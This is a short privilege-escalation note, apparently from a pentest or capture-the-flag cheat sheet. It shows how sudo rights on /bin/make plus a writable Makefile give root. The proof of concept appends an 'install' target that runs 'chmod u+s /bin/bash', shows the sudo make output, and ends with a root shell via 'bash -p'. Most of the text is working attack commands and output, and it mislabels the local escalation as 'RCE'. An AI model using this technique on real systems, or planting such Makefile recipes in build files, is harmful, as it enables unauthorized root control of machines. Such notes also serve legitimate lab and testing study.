# make

---

When we can run /bin/make with sudo permissions to build files. There is usually an directory in which the "Makefile" is inside. If we have write access to this file, we can embedd an malicious payload and run the /bin/make binary to execute our malicious payload with sudo permissions.

## PoC 

In case our nano is weak, we can utilize the following command to set the bash binary to SUID.

```
echo -e 'all:\n\t@echo "Do nothing in all"\n\ninstall:\n\tchmod u+s /bin/bash' >> Makefile
```

```
profiler@spx:~$ sudo /usr/bin/make install -C /home/profiler/php-spx
make: Entering directory '/home/profiler/php-spx'
Makefile:268: warning: overriding recipe for target 'all'
Makefile:52: warning: ignoring old recipe for target 'all'
Installing shared extensions:     /usr/lib/php/20210902/
Installing SPX web UI to: /usr/share/misc/php-spx/assets/web-ui
chmod u+s /bin/bash
make: Leaving directory '/home/profiler/php-spx'
```

Gained RCE as user "root".

```
profiler@spx:~$ /bin/bash -p
bash-5.1#
```
